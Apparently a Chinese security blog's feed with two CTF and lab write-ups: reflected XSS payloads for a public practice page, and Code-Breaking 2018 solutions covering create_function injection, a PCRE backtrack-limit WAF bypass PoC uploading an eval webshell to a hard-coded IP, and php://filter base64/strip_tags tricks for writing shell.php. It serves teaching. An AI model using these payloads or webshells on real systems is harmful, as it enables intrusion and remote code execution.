        <content type="html"><![CDATA[<blockquote><p>一个基础的、面向新手的XSS靶场</p></blockquote><p><img src="/xss.png" alt></p><a id="more"></a><h1 id="XSS练习笔记"><a href="#XSS练习笔记" class="headerlink" title="XSS练习笔记"></a>XSS练习笔记</h1><p>XSS基础知识：<br><a href="https://portswigger.net/web-security/cross-site-scripting" target="_blank" rel="noopener">https://portswigger.net/web-security/cross-site-scripting</a></p><p>练习靶场：<br><a href="https://brutelogic.com.br/xss.php" target="_blank" rel="noopener">https://brutelogic.com.br/xss.php</a></p><p>官方WP：<br><a href="https://brutelogic.com.br/blog/the-7-main-xss-cases-everyone-should-know/" target="_blank" rel="noopener">https://brutelogic.com.br/blog/the-7-main-xss-cases-everyone-should-know/</a></p><h2 id="1-URL-Reflection"><a href="#1-URL-Reflection" class="headerlink" title="1. URL Reflection"></a>1. URL Reflection</h2><p>当URL以某种方式显示在源代码中时，我们可以添加自己的<code>XSS向量</code>或者<code>payload</code>。对于PHP页面，可以<strong>使用斜杠字符</strong> <code>/</code> 在页面名称之后添加任何内容（不更改它）。</p><p><img src="rAdL61s.png" alt><br>如上图，URL的值会显示在<code>action</code>属性中<br>payload：<code>http://brutelogic.com.br/xss.php/&quot;&gt;&lt;svg onload=alert(1)&gt;</code></p><h2 id="2-Simple-HTMLi-HTML-injection"><a href="#2-Simple-HTMLi-HTML-injection" class="headerlink" title="2. Simple HTMLi (HTML injection)"></a>2. Simple HTMLi (HTML injection)</h2><p>输入的内容在现有标签之间。没有过滤任何东西。<br><img src="zAUOs5P.png" alt><br>如上图，<code>guest</code>的值就是参数<code>a</code>的值。<br>payload：<code>http://brutelogic.com.br/xss.php?a=&lt;svg onload=alert(1)&gt;</code></p><h2 id="3-Inline-HTMLi-Double-Quotes"><a href="#3-Inline-HTMLi-Double-Quotes" class="headerlink" title="3. Inline HTMLi (Double Quotes)"></a>3. Inline HTMLi (Double Quotes)</h2><p>可以使用<code>&quot;&gt;</code>将其闭合。<br><img src="FAD1ytQ.png" alt><br>payload：<code>http://brutelogic.com.br/xss.php?b1=&quot;&gt;&lt;svg onload=alert(1)&gt;</code></p><h2 id="4-Inline-HTMLi-Single-Quotes"><a href="#4-Inline-HTMLi-Single-Quotes" class="headerlink" title="4. Inline HTMLi (Single Quotes)"></a>4. Inline HTMLi (Single Quotes)</h2><p>跟上面一样，使用<code>&#39;&gt;</code>进行闭合<br><img src="DRvisKI.png" alt><br>payload：<code>https://brutelogic.com.br/xss.php?b2=&#39;&gt;&lt;svg onload=alert(1)&gt;</code></p><h2 id="5-Inline-HTMLi-No-Tag-Breaking-Double-Quotes"><a href="#5-Inline-HTMLi-No-Tag-Breaking-Double-Quotes" class="headerlink" title="5. Inline HTMLi - No Tag Breaking (Double Quotes)"></a>5. Inline HTMLi - No Tag Breaking (Double Quotes)</h2><p>该内联HTML注入中转义了<code>&gt;</code>不能像上一关那样使用<code>&quot;&gt;</code>闭合</p><p><img src="Vue05Vr.png" alt></p><p>可以<code>&quot;</code>闭合后，增加一个<code>onmouseover</code>属性<br>payload：<code>http://brutelogic.com.br/xss.php?b3=&quot; onmouseover=alert(1)//</code></p><blockquote><p>双斜线注释掉<code>&quot;</code></p></blockquote><p>演示结果：<br><img src="BS0cNvE.png" alt></p><p>也可以使用<code>&quot;alert(1)&quot;</code><br>payload：<code>http://brutelogic.com.br/xss.php?b3=&quot; onmouseover=&quot;alert(1)</code></p><p>演示结果：<br><img src="v21UcYg.png" alt></p><h2 id="6-Inline-HTMLi-No-Tag-Breaking-Single-Quotes"><a href="#6-Inline-HTMLi-No-Tag-Breaking-Single-Quotes" class="headerlink" title="6. Inline HTMLi - No Tag Breaking (Single Quotes)"></a>6. Inline HTMLi - No Tag Breaking (Single Quotes)</h2><p>同上<br>payload：<code>http://brutelogic.com.br/xss.php?b4=&#39; onmouseover=alert(1)//</code><br>payload：<code>http://brutelogic.com.br/xss.php?b4=&#39; onmouseover=&#39;alert(1)</code></p><h2 id="7-HTMLi-in-Js-Block-Single-Quotes"><a href="#7-HTMLi-in-Js-Block-Single-Quotes" class="headerlink" title="7. HTMLi in Js Block (Single Quotes)"></a>7. HTMLi in Js Block (Single Quotes)</h2><p>输入有时会进入一个javascript块（脚本标签），通常是代码的某个变量的值。<br>但是因为<strong>HTML标签在浏览器的解析中具有优先权</strong>，所以我们可以简单地终止JS块并插入新标签。</p><p><img src="JKhLB3x.png" alt></p><p>payload：<code>http://brutelogic.com.br/xss.php?c1=&lt;/script&gt;&lt;svg onload=alert(1)&gt;</code></p><h2 id="8-HTMLi-in-Js-Block-Double-Quotes"><a href="#8-HTMLi-in-Js-Block-Double-Quotes" class="headerlink" title="8. HTMLi in Js Block (Double Quotes)"></a>8. HTMLi in Js Block (Double Quotes)</h2><p>同上<br>payload：<code>http://brutelogic.com.br/xss.php?c2=&lt;/script&gt;&lt;svg onload=alert(1)&gt;</code></p><h2 id="9-Simple-Js-Injection-Single-Quotes"><a href="#9-Simple-Js-Injection-Single-Quotes" class="headerlink" title="9. Simple Js Injection (Single Quotes)"></a>9. Simple Js Injection (Single Quotes)</h2><p>跟上一关的情况类似，输入的值显示在JS代码块中，但是过滤了<code>&lt;</code>，无法使用<code>&lt;/script&gt;</code>闭合JS代码块。<br>所以要进行的是注入javascript代码，并且注意语法。方法是<strong>连接</strong>我们想要执行的代码，使用<code>-</code>连接。单引号进行闭合。</p><p>payload：<code>http://brutelogic.com.br/xss.php?c3=&#39;-alert(1)-&#39;</code></p><p>演示结果：<br><img src="ssLX7bt.png" alt></p><h2 id="10-Simple-Js-Injection-Double-Quotes"><a href="#10-Simple-Js-Injection-Double-Quotes" class="headerlink" title="10. Simple Js Injection (Double Quotes)"></a>10. Simple Js Injection (Double Quotes)</h2><p>同上<br>payload：<code>http://brutelogic.com.br/xss.php?c4=&quot;-alert(1)-&quot;</code></p><h2 id="11-Escaped-Js-Injection-Single-Quotes"><a href="#11-Escaped-Js-Injection-Single-Quotes" class="headerlink" title="11. Escaped Js Injection (Single Quotes)"></a>11. Escaped Js Injection (Single Quotes)</h2><p>该题中，对输入的<code>&#39;</code>进行了转义：<code>&#39;</code>–&gt;<code>\&#39;</code>，就直接输出了<code>&#39;</code>，而无法注入。<br>可以输入在<code>&#39;</code>前输入<code>\</code>，使得转义后变成<code>\\&#39;</code>，那么最终输出的值为<code>\</code>，而<code>&#39;</code>不作为值。必要时需要使用<code>//</code>注释掉后面多余的字符。<br>payload：<code>http://brutelogic.com.br/xss.php?c5=\&#39;-alert(1)//</code></p><p>演示结果：<br><img src="ZsdyJbm.png" alt></p><h2 id="12-Escaped-Js-Injection-Double-Quotes"><a href="#12-Escaped-Js-Injection-Double-Quotes" class="headerlink" title="12. Escaped Js Injection (Double Quotes)"></a>12. Escaped Js Injection (Double Quotes)</h2><p>同上</p><p>payload：<code>http://brutelogic.com.br/xss.php?c6=\&quot;-alert(1)//</code></p>]]></content>
      
      
      <categories>
          
          <category> Web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> XSS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Code-Breaking Puzzles 2018 做题记录</title>
      <link href="/passages/Code-Breaking2018/"/>
      <url>/passages/Code-Breaking2018/</url>
      
        <content type="html"><![CDATA[<blockquote><p>P神的Code-Breaking Puzzles 2018 全都是好题目。<br>项目地址：<a href="https://github.com/phith0n/code-breaking" target="_blank" rel="noopener">https://github.com/phith0n/code-breaking</a></p></blockquote><a id="more"></a><h2 id="一-easy-–-function"><a href="#一-easy-–-function" class="headerlink" title="一. easy – function"></a>一. easy – function</h2><p>源码审计：<br><img src="./1-1.png" alt></p><p>思路很清晰，想办法在函数名的头或者尾找一个字符，不影响函数调用。<br>可以使用burpsuite来fuzz。</p><p><strong>知识点一</strong>：<br>在PHP的命名空间默认为\，所有的函数和类都在\这个命名空间中，如果直接写函数名<code>function_name()</code>调用，调用的时候其实<code>相当于写了一个相对路径</code>；而如果写<code>\function_name()</code> 这样调用函数，则<code>其实是写了一个绝对路径</code>。如果你在其他namespace里调用系统类，就必须写绝对路径这种写法。</p><p>接下来就是要找到一个神奇的可控的函数。<br><strong>知识点二</strong>：<br>可以用<code>create_function</code>来完成，<code>create_function</code>的第一个参数是参数，第二个参数是内容。<br>函数结构形似：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">create_function(<span class="string">'$a,$b'</span>,<span class="string">'return 111'</span>)</span><br><span class="line"></span><br><span class="line">==&gt;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">a</span><span class="params">($a, $b)</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">111</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>然后执行，如果我们想要执行任意代码，<code>就首先需要跳出这个函数定义</code>。<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">reate_function(<span class="string">'$a,$b'</span>,<span class="string">'return 111;&#125;phpinfo();//'</span>)</span><br><span class="line"></span><br><span class="line">==&gt;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">a</span><span class="params">($a, $b)</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">111</span>;&#125;phpinfo();<span class="comment">//</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>利用payload如下<br><img src="./1-2.png" alt></p><p><strong>长姿势</strong>：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$handler=opendir(<span class="string">'../'</span>);</span><br><span class="line"><span class="keyword">while</span>(($filename=readdir($handler))!==<span class="keyword">false</span>)</span><br><span class="line">    &#123;<span class="keyword">echo</span> $filename.<span class="string">"&lt;br/&gt;"</span>;&#125;</span><br></pre></td></tr></table></figure></p><p>利用上述php代码可以<strong>遍历服务器中某一目录的文件</strong>。</p><h2 id="二-easy-–-pcrewaf"><a href="#二-easy-–-pcrewaf" class="headerlink" title="二. easy – pcrewaf"></a>二. easy – pcrewaf</h2><p><strong>PHP利用PCRE回溯次数限制绕过某些安全限制</strong></p><p>源码审计：<br><img src="./2-1.png" alt></p><p>看了WP后，实在是长姿势，偷偷记下来。(带水印的图片均来自P神的原图)</p><h3 id="2-1-正则表达式介绍"><a href="#2-1-正则表达式介绍" class="headerlink" title="2.1 正则表达式介绍"></a>2.1 正则表达式介绍</h3><p>正则表达式是一个可以被“有限状态自动机”接受的语言类。</p><p>“有限状态自动机”，其拥有有限数量的状态，每个状态可以迁移到零个或多个状态，输入字串决定执行哪个状态的迁移。而常见的正则引擎，又被细分为<strong>DFA</strong>（确定性有限状态自动机）与<strong>NFA</strong>（非确定性有限状态自动机）。他们匹配输入的过程分别是：</p><ul><li><p>DFA: 从起始状态开始，一个字符一个字符地读取输入串，并根据正则来一步步确定至下一个转移状态，直到匹配不上或走完整个输入</p></li><li><p>NFA：从起始状态开始，一个字符一个字符地读取输入串，并与正则表达式进行匹配，如果匹配不上，则进行回溯，尝试其他状态由于NFA的执行过程存在回溯，所以其性能会劣于DFA，但它支持更多功能。<strong>大多数程序语言都使用了NFA作为正则引擎，其中也包括PHP使用的PCRE库。</strong></p></li></ul><h3 id="2-2-NFA执行的回溯过程"><a href="#2-2-NFA执行的回溯过程" class="headerlink" title="2.2 NFA执行的回溯过程"></a>2.2 NFA执行的回溯过程</h3><p>所以，我们题目中的正则<code>&lt;\?.*[(`;?&gt;].*</code>，假设匹配的输入是<code>&lt;?php phpinfo();//aaaaa</code>,实际执行流程是这样的：<br><img src="./2-2.png" alt></p><p>（正则表达式在线调试：<a href="https://regex101.com/" target="_blank" rel="noopener">https://regex101.com/</a> ）<br>（正则表达式查找手册：<a href="http://tool.oschina.net/uploads/apidocs/jquery/regexp.html" target="_blank" rel="noopener">http://tool.oschina.net/uploads/apidocs/jquery/regexp.html</a> ）</p><p>见上图，可见第4步的时候，因为第一个<code>.*</code>可以匹配任何字符，所以最终匹配到了输入串的结尾，也就是<code>//aaaaa</code>。但此时显然是不对的，因为正则显示<code>.*</code>后面还应该有一个字符<code>[(`;?&gt;]</code>。</p><p>所以NFA就开始回溯，先吐出一个<code>a</code>，输入变成第5步显示的<code>//aaaa</code>，但仍然匹配不上正则，继续吐出<code>a</code>，变成<code>//aaa</code>，仍然匹配不上……</p><p>最终直到吐出<code>;</code>，输入变成第12步显示的<code>&lt;?php phpinfo()</code>，此时，<code>.*</code>匹配的是<code>php phpinfo()</code>，而后面的<code>;</code>则匹配上<code>[(`;?&gt;]</code>，这个结果满足正则表达式的要求，于是不再回溯。13步开始向后匹配<code>;</code>，14步匹配<code>.*</code>，第二个<code>.*</code>匹配到了字符串末尾，最后结束匹配。</p><h3 id="2-3-PHP的pcre-backtrack-limit限制利用"><a href="#2-3-PHP的pcre-backtrack-limit限制利用" class="headerlink" title="2.3 PHP的pcre.backtrack_limit限制利用"></a>2.3 PHP的pcre.backtrack_limit限制利用</h3><p>PHP为了防止正则表达式的拒绝服务攻击（reDOS），给pcre设定了一个回溯次数上限<code>pcre.backtrack_limit</code>。我们可以通过<code>var_dump(ini_get(&#39;pcre.backtrack_limit&#39;));</code>的方式查看当前环境下的上限：<br><img src="./2-3.png" alt></p><p>可见，回溯次数上限默认是100万。那么，假设我们的回溯次数超过了100万，会出现什么现象呢？比如：<br><img src="./2-4.png" alt></p><p>可见，preg_match返回的非1和0，而是false。</p><p>所以本题的POC为：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> io <span class="keyword">import</span> BytesIO</span><br><span class="line"></span><br><span class="line">files = &#123;</span><br><span class="line">  <span class="string">'file'</span>: BytesIO(<span class="string">b'aaa&lt;?php eval($_POST[txt]);//'</span> + <span class="string">b'a'</span> * <span class="number">1000000</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">res = requests.post(<span class="string">'http://47.112.16.34:8071/'</span>, files=files, allow_redirects=<span class="literal">False</span>)</span><br><span class="line">print(res.headers)  <span class="comment">#响应头显示文件位置</span></span><br></pre></td></tr></table></figure><h3 id="2-4-FILES全局变量介绍及用法"><a href="#2-4-FILES全局变量介绍及用法" class="headerlink" title="2.4 $_FILES全局变量介绍及用法"></a>2.4 $_FILES全局变量介绍及用法</h3><p>此数组包含有所有上传的文件信息。<br>看一个例子：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- The data encoding type, enctype, MUST be specified <span class="keyword">as</span> below --&gt;</span><br><span class="line">&lt;form enctype=<span class="string">"multipart/form-data"</span> action=<span class="string">"__URL__"</span> method=<span class="string">"POST"</span>&gt;</span><br><span class="line">    &lt;!-- MAX_FILE_SIZE must precede the file input field --&gt;</span><br><span class="line">    &lt;input type=<span class="string">"hidden"</span> name=<span class="string">"MAX_FILE_SIZE"</span> value=<span class="string">"30000"</span> /&gt;</span><br><span class="line">    &lt;!-- Name of input element determines name in $_FILES <span class="keyword">array</span> --&gt;</span><br><span class="line">    Send this file: &lt;input name=<span class="string">"userfile"</span> type=<span class="string">"file"</span> /&gt;</span><br><span class="line">    &lt;input type=<span class="string">"submit"</span> value=<span class="string">"Send File"</span> /&gt;</span><br><span class="line">&lt;/form&gt;</span><br></pre></td></tr></table></figure></p><blockquote><p>Note:<br>要确保文件上传表单的属性是 enctype=”multipart/form-data”，否则文件上传不了。 </p></blockquote><p>MAX_FILE_SIZE 隐藏字段（单位为字节）必须放在文件输入字段之前，其值为接收文件的最大尺寸。这是对浏览器的一个建议，PHP 也会检查此项。</p><p>以上范例中 $_FILES 数组的内容如下所示。我们假设文件上传字段的名称如上例所示，为 userfile。名称可随意命名。</p><p>$_FILES[‘userfile’][‘name’]</p><blockquote><p>客户端机器文件的原名称。</p></blockquote><p>$_FILES[‘userfile’][‘type’]</p><blockquote><p>文件的 MIME 类型，如果浏览器提供此信息的话。一个例子是“image/gif”。不过此 MIME 类型在 PHP 端并不检查，因此不要想当然认为有这个值。</p></blockquote><p>$_FILES[‘userfile’][‘size’]</p><blockquote><p>已上传文件的大小，单位为字节。</p></blockquote><p>$_FILES[‘userfile’][‘tmp_name’]</p><blockquote><p>文件被上传后在服务端储存的临时文件名。</p></blockquote><p>$_FILES[‘userfile’][‘error’]</p><blockquote><p>和该文件上传相关的错误代码。此项目是在 PHP 4.2.0 版本中增加的。</p></blockquote><h3 id="2-5-requests模块中POST一个多部分编码-Multipart-Encoded-的文件"><a href="#2-5-requests模块中POST一个多部分编码-Multipart-Encoded-的文件" class="headerlink" title="2.5 requests模块中POST一个多部分编码(Multipart-Encoded)的文件"></a>2.5 requests模块中POST一个多部分编码(Multipart-Encoded)的文件</h3><p>Requests 使得上传多部分编码文件变得很简单：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>url = <span class="string">'http://httpbin.org/post'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>files = &#123;<span class="string">'file'</span>: open(<span class="string">'report.xls'</span>, <span class="string">'rb'</span>)&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>r = requests.post(url, files=files)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>r.text</span><br><span class="line">&#123;</span><br><span class="line">  ...</span><br><span class="line">  <span class="string">"files"</span>: &#123;</span><br><span class="line">    <span class="string">"file"</span>: <span class="string">"&lt;censored...binary...data&gt;"</span></span><br><span class="line">  &#125;,</span><br><span class="line">  ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>可以显式地设置文件名，文件类型和请求头：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>url = <span class="string">'http://httpbin.org/post'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>files = &#123;<span class="string">'file'</span>: (<span class="string">'report.xls'</span>, open(<span class="string">'report.xls'</span>, <span class="string">'rb'</span>), <span class="string">'application/vnd.ms-excel'</span>, &#123;<span class="string">'Expires'</span>: <span class="string">'0'</span>&#125;)&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>r = requests.post(url, files=files)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>r.text</span><br><span class="line">&#123;</span><br><span class="line">  ...</span><br><span class="line">  <span class="string">"files"</span>: &#123;</span><br><span class="line">    <span class="string">"file"</span>: <span class="string">"&lt;censored...binary...data&gt;"</span></span><br><span class="line">  &#125;,</span><br><span class="line">  ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>也可以发送作为文件来接收的字符串：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>url = <span class="string">'http://httpbin.org/post'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>files = &#123;<span class="string">'file'</span>: (<span class="string">'report.csv'</span>, <span class="string">'some,data,to,send\nanother,row,to,send\n'</span>)&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>r = requests.post(url, files=files)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>r.text</span><br><span class="line">&#123;</span><br><span class="line">  ...</span><br><span class="line">  <span class="string">"files"</span>: &#123;</span><br><span class="line">    <span class="string">"file"</span>: <span class="string">"some,data,to,send\\nanother,row,to,send\\n"</span></span><br><span class="line">  &#125;,</span><br><span class="line">  ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><del>全文参考</del>：<a href="https://www.leavesongs.com/PENETRATION/use-pcre-backtrack-limit-to-bypass-restrict.html" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/use-pcre-backtrack-limit-to-bypass-restrict.html</a></p><h2 id="三-easy-phpmagic"><a href="#三-easy-phpmagic" class="headerlink" title="三. easy - phpmagic"></a>三. easy - phpmagic</h2><h3 id="3-1-php-filter的妙用"><a href="#3-1-php-filter的妙用" class="headerlink" title="3.1 php://filter的妙用"></a>3.1 php://filter的妙用</h3><p>P神的博客干货真多！<del>全程参考</del>：<br><a href="https://www.leavesongs.com/PENETRATION/php-filter-magic.html" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/php-filter-magic.html</a></p><p><strong>php://filter</strong>是PHP中独有的协议，利用这个协议可以创造很多“妙用”。</p><h4 id="3-1-1-XXE中的利用"><a href="#3-1-1-XXE中的利用" class="headerlink" title="3.1.1 XXE中的利用"></a>3.1.1 XXE中的利用</h4><p>php://filter之前最常出镜的地方是XXE。由于XXE漏洞的特殊性，我们在读取HTML、PHP等文件时可能会抛出此类错误<code>parser error : StartTag: invalid element name</code> 。其原因是，PHP是基于标签的脚本语言，<code>&lt;?php ... ?&gt;</code>这个语法也与XML相符合，所以在解析XML的时候会被误认为是XML，而其中内容（比如特殊字符）又有可能和标准XML冲突，所以导致了出错。</p><p>那么，为了读取包含有敏感信息的PHP等源文件，我们就要先将“可能引发冲突的PHP代码”编码一遍，这里就会用到php://filter。</p><p>php://filter是PHP语言中特有的协议流，作用是作为一个“中间流”来处理其他流。比如，我们可以用如下一行代码将POST内容转换成base64编码并输出：</p><p>readfile(“php://filter/read=convert.base64-encode/resource=php://input”);</p><p>如下：<br><img src="./3-1.png" alt><br><strong>php://filter/read=convert.base64-encode/resource=php://input</strong></p><p>所以，在XXE中，我们也可以将PHP等容易引发冲突的文件流用php://filter协议流处理一遍，这样就能有效规避特殊字符造成混乱。<br>如下，我们使用的是<code>php://filter/read=convert.base64-encode/resource=./xxe.php</code><br><img src="./3-2.png" alt><br><strong>php://filter/read=convert.base64-encode/resource=./xxe.php</strong></p><h4 id="3-1-2-巧用编码与解码"><a href="#3-1-2-巧用编码与解码" class="headerlink" title="3.1.2 巧用编码与解码"></a>3.1.2 巧用编码与解码</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$content = <span class="string">'&lt;?php exit; ?&gt;'</span>;</span><br><span class="line">$content .= $_POST[<span class="string">'txt'</span>];</span><br><span class="line">file_put_contents($_POST[<span class="string">'filename'</span>], $content);</span><br></pre></td></tr></table></figure><p><code>$content</code>在开头增加了exit过程，导致即使我们成功写入一句话，也执行不了（这个过程在实战中十分常见，通常出现在缓存、配置文件等等地方，不允许用户直接访问的文件，都会被加上<code>if(!defined(xxx))exit;</code>之类的限制）。那么这种情况下，如何绕过这个“死亡exit”？<br>幸运的是，这里的<code>$_POST[&#39;filename&#39;]</code>是<strong>可以控制协议的</strong>，我们即可使用 php://filter协议来施展魔法：使用php://filter流的base64-decode方法，将<code>$content</code>解码，利用php base64_decode函数特性去除“死亡exit”。</p><p>众所周知，base64编码中只包含64个可打印字符，而PHP在解码base64时，遇到不在其中的字符时，将会跳过这些字符，仅将合法字符组成一个新的字符串进行解码。<br>所以，一个正常的base64_decode实际上可以理解为如下两个步骤：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$_GET[<span class="string">'txt'</span>] = preg_replace(<span class="string">'|[^a-z0-9A-Z+/]|s'</span>, <span class="string">''</span>, $_GET[<span class="string">'txt'</span>]);</span><br><span class="line">base64_decode($_GET[<span class="string">'txt'</span>]);</span><br></pre></td></tr></table></figure></p><p>所以，当<code>$content</code>被加上了<code>&lt;?php exit; ?&gt;</code>以后，我们可以使用 php://filter/write=convert.base64-decode 来首先对其解码。在解码的过程中，字符<code>&lt;</code> <code>?</code> <code>;</code> <code>&gt;</code> <code>空格</code>等不符合base64编码的字符范围将被忽略，所以最终被解码的字符仅有“phpexit”和我们传入的其他字符。</p><p>“phpexit”一共7个字符，因为base64算法解码时是4个byte一组，所以给他增加1个“a”一共8个字符。这样，”phpexita”被正常解码，而后面我们传入的webshell的base64内容也被正常解码。结果就是<code>&lt;?php exit; ?&gt;</code>没有了。</p><p>最后效果是 ：<br><img src="./3-3.png" alt><br><strong>php://filter/write=convert.base64-decode/resource=shell.php</strong></p><h4 id="3-1-3-利用字符串操作方法"><a href="#3-1-3-利用字符串操作方法" class="headerlink" title="3.1.3 利用字符串操作方法"></a>3.1.3 利用字符串操作方法</h4><p>除了使用base64特性的方法外，我们还可以利用php://filter字符串处理方法来去除“死亡exit”。我们观察一下，这个<code>&lt;?php exit; ?&gt;</code>实际上是什么？<br>实际上是一个XML标签，既然是XML标签，我们就可以利用strip_tags函数去除它，而php://filter刚好是支持这个方法的。</p><p>编写如下测试代码即可查看 <code>php://filter/read=string.strip_tags/resource=php://input</code> 的效果：</p><p><code>echo readfile(&#39;php://filter/read=string.strip_tags/resource=php://input&#39;);</code><br><img src="./3-4.png" alt><br><strong>php://filter/read=string.strip_tags/resource=php://input</strong></p><p>可见，<code>&lt;?php exit; ?&gt;</code>被去除了。但回到上面的题目，我们最终的目的是写入一个webshell，而写入的webshell也是php代码，如果使用strip_tags同样会被去除。</p><p>万幸的是，php://filter允许使用多个过滤器，我们可以先将webshell用base64编码。在调用完成strip_tags后再进行base64-decode。“死亡exit”在第一步被去除，而webshell在第二步被还原。</p><p>最终的数据包如下：<br><img src="./3-5.png" alt><br><strong>php://filter/write=string.strip_tags|convert.base64-decode/resource=shell.php</strong></p><p>综上，我们得出，<strong>只要是传filename的地方，基本都可以传协议流。</strong></p><h3 id="3-2-后缀名后加上-，pathinfo就取不到后缀名，且可以正常写入-php之中。"><a href="#3-2-后缀名后加上-，pathinfo就取不到后缀名，且可以正常写入-php之中。" class="headerlink" title="3.2 后缀名后加上/.，pathinfo就取不到后缀名，且可以正常写入.php之中。"></a>3.2 后缀名后加上<code>/.</code>，pathinfo就取不到后缀名，且可以正常写入.php之中。</h3><p>这确实很实用，原理性介绍参考（先给自己挖个坑）： <a href="http://wonderkun.cc/index.html/?p=626" target="_blank" rel="noopener">php &amp; apache2 &amp;操作系统之间的一些黑魔法</a></p><h3 id="3-3-SERVER-‘SERVER-NAME’-函数"><a href="#3-3-SERVER-‘SERVER-NAME’-函数" class="headerlink" title="3.3 $_SERVER[‘SERVER_NAME’] 函数"></a>3.3 $_SERVER[‘SERVER_NAME’] 函数</h3><p>查看一下官方手册：<br><img src="./servername.png" alt></p><p>注意 note 部分，这个值可以被伪造：<br>它的值取的是HTTP headers中的<code>Host</code>的值。</p><h3 id="3-4-利用-base64-编码和解码写入shell"><a href="#3-4-利用-base64-编码和解码写入shell" class="headerlink" title="3.4 利用 base64 编码和解码写入shell"></a>3.4 利用 base64 编码和解码写入shell</h3><p>利用一个PHP伪协议base64解码的trick：<strong>解码中遇到不符合规范的字符直接跳过</strong>。</p><p>另外因为base64解码是4位一组来解，所以我们要保证我们需要解码的字符串之前的合法字符数为4的倍数，这样就不会影响我们传入的字符串正常解码。测试一下：<br><img src="./burp.png" alt></p><p>在传入的字符前，符合base64规范的字符是：</p><blockquote><p>ltltgtgtDiG9959deb8u15DebianltltgtgttAq </p></blockquote><p>40位长，不需要再添加其他字符。（<strong>注意</strong>：base64中的<code>=</code>只能出现在最末尾，而我们插入的字符串是在<code>中间</code>的，所以我们插入的字符串里不能有=。）</p><p>getshell: <code>&lt;?php eval($_REQUEST[&#39;cmd&#39;]);//?&gt;</code><br>base64: <code>PD9waHAgZXZhbCgkX1JFUVVFU1RbJ2NtZCddKTsvLz8+</code></p><p>写入：<br><img src="./uploadshell.png" alt></p><p>至此，getshell成功。</p><h2 id="四-easy-phplimit"><a href="#四-easy-phplimit" class="headerlink" title="四. easy - phplimit"></a>四. easy - phplimit</h2><p>题目描述：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span 